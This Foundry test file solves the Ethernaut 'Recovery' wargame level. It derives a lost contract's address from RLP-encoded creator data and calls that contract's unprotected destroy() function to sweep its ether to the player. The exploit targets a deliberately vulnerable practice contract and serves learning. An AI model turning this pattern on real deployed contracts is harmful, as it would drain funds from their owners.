// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Recovery, SimpleToken} from "ethernaut/levels/Recovery.sol";

contract RecoveryTest is Test {
    Recovery target;
    address player;
    address lostAddress;

    uint256 constant supply = 100_000_000;
    uint256 constant etherAmount = 0.001 ether;

    function setUp() public {
        player = makeAddr("player");

        target = new Recovery();

        // create a token
        target.generateToken("EtherToken", supply);

        // find the address (this is literally the answer though)
        bytes32 rlp = keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), address(target), uint8(0x01)));
        lostAddress = address(uint160(uint256(rlp)));

        // confirm setup
        assertEq(
            SimpleToken(payable(lostAddress)).balances(address(this)), supply, "owner should have the correct balance"
        );

        // send some ether to SimpleToken
        (bool ok,) = lostAddress.call{value: etherAmount}("");
        assertTrue(ok, "should send ether");
    }

    /**
     * RLP encoding is as follows:
     *
     * ```
     * [
     *   0xC0
     *     + 1 (a byte for string length)
     *     + 20 (string length itself)
     *     + 1 (nonce),
     *     = 0xC0 + 0x16 = 0xD6
     *   0x80
     *     + 20 (string length),
     *     = 0x80 + 0x14 = 0x94
     *   <20 byte string> = address
     *   <1 byte nonce> = 0x01
     * ]
     * ```
     *
     * In short: `[0xD6, 0x94, <address>, 0x01]`
     */
    function attack() private {
        // find the SimpleToken address
        bytes32 rlp = keccak256(abi.encodePacked(uint8(0xd6), uint8(0x94), address(target), uint8(0x01)));
        address addr = address(uint160(uint256(rlp)));

        // recover the tokens
        SimpleToken(payable(addr)).destroy(payable(player));
    }

    function testAttack() public {
        vm.startPrank(player);
        attack();
        vm.stopPrank();

        assertEq(player.balance, etherAmount, "player should have received ether");
    }
}
